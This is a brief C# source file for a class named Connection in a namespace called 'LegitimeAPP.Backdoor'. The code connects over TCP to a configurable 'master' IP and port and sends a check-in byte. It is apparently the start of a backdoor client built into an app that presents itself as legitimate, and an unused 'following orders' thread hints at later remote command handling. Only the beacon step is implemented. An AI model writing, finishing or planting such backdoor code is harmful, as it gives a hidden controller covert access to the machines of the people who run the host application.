
using System ;
using System.Net ;
using System.Net.Sockets ;
using System.Threading;
using System.Text;
using System.IO;
using System.Collections;
using System.Collections.Generic ;
using System.Xml;
using System.Xml.Serialization;

namespace LegitimeAPP.Backdoor {
    public class Connection {


        private IPAddress _masterIP ;
        private int _masterPort ;

        private Thread _followingOrders ;


        public Connection(string masterIP, int masterPort) {
            _masterIP = IPAddress.Parse(masterIP) ;
            _masterPort = masterPort ;

            this.MakeConnectionRequest() ; 
        }

        private void MakeConnectionRequest() {

            Stream stm ; 
            TcpClient tcp = new TcpClient() ;
            ASCIIEncoding enc = new ASCIIEncoding() ; 

            try {
                byte[] data = new byte[1024] ;

                // try to connect to host

                tcp.Connect(_masterIP, _masterPort) ;
                stm = tcp.GetStream() ;

                stm.Write(enc.GetBytes("1") ) ; 
                

                
            } catch( Exception e) {
                Console.WriteLine(e.StackTrace) ; 
            } 

        }
    }
}